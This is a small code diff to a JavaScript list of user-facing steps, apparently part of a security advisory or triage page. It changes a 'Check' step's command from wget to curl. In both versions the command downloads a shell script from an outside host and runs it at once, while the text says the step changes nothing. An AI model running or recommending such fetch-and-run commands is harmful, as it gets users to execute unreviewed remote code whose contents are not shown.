@@ -19,7 +19,7 @@ const steps = [
   {
     title: 'Check',
     text: 'Only reads and prints a report. It changes nothing.',
-    command: 'wget -q https://app.gl-i.net/csa-2026-01-fix -O gl-helper-triage.sh ; sh gl-helper-triage.sh',
+    command: 'curl -fsSL https://app.gl-i.net/csa-2026-01-fix -o gl-helper-triage.sh ; sh gl-helper-triage.sh',
   },
   {
     title: 'Save the evidence',
